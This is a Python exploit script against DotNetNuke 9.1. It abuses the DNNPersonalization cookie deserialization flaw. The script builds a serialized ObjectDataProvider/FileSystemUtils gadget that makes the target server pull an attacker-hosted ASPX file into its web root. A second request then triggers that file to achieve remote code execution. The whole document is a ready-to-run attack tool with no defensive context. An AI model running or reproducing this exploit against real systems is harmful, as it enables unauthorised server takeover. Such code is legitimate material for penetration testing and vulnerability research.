import sys, requests, argparse

proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "https://127.0.0.1:8080",
}

def createObject(lhost, payloadFile):
	print("\n[+] Crafting serialized payload...")
	object = '''<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://%s/%s</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/%s</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>''' % (lhost, payloadFile, payloadFile)
	return str(object)

def delivery(ip, lhost, lport, payloadFile):
	s = requests.session()
	target = "http://%s/dotnetnuke/" % ip
	cookie = createObject(lhost, payloadFile)
	headers = {'Cookie': 'DNNPersonalization=' + cookie}
	print("[+] ASPX payload file delivered")
	s.get(target + 'random', headers=headers, proxies=proxies)
	print("[+] Triggering payload...")
	s.get(target + payloadFile, proxies=proxies)

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('--ip', help='Target IP address', required=True)
	parser.add_argument('--lhost', help='Local listener IP address', required=True)
	parser.add_argument('--lport', help='Local listener port', required=True)
	parser.add_argument('--payload', help='Payload file', required=True)
	if len(sys.argv)<=1:
		print("[!] Usage: python3 %s --ip 192.168.0.5:80/dotnetnuke --lhost 192.168.0.1 --lport 8080" % sys.argv[0])
		parser.print_help()
		sys.exit(-1)
	args = parser.parse_args()
	ip = args.ip
	lhost = args.lhost
	lport = args.lport
	payloadFile = args.payload

	delivery(ip, lhost, lport, payloadFile)

if __name__ == "__main__":
	main()
